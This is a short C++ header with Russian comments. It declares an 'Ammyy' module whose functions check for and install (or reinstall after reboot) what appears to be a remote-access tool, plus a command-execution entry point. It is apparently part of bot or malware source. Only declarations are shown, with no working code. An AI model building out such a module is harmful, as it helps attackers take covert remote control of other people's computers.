#ifndef AmmyyH
#define AmmyyH

namespace Ammyy
{

extern const char* NameCmd;

bool Execute(PTaskManager Manager, PCHAR Command, PCHAR Args);
//возвращает true, если ammyy установлен
bool Installed();
//уставливает Ammyy, если update = false, то если уже установлен, то повторно не ставит
//если update = true, если уже устновлен, то заново ставит (обновится после ребута)
bool Install( bool update = false );

}

#endif //AmmyyH
